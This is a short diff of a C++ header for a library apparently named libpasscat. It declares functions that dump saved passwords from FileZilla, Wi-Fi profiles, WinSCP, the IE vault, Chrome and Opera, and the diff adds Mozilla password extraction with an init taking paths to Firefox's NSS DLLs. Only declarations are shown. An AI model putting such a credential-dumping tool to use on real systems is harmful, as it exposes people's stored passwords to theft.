@@ -26,7 +26,7 @@
 
 namespace libpasscat {
 	extern bool initialized;
-	void init(void);
+	void init(std::wstring nss3Dll, std::wstring mozglueDll);
 	void cat_filezilla_passwords(void);
 	void cat_wifi_passwords(void);
 	void cat_winscp_passwords(void);
@@ -35,5 +35,6 @@ namespace libpasscat {
 	void cat_vault_ie_passwords(void);
 	void cat_chrome_passwords(void);
 	void cat_opera_passwords(void);
+	void cat_mozilla_passwords(void);
 	void finalize(void);
 }
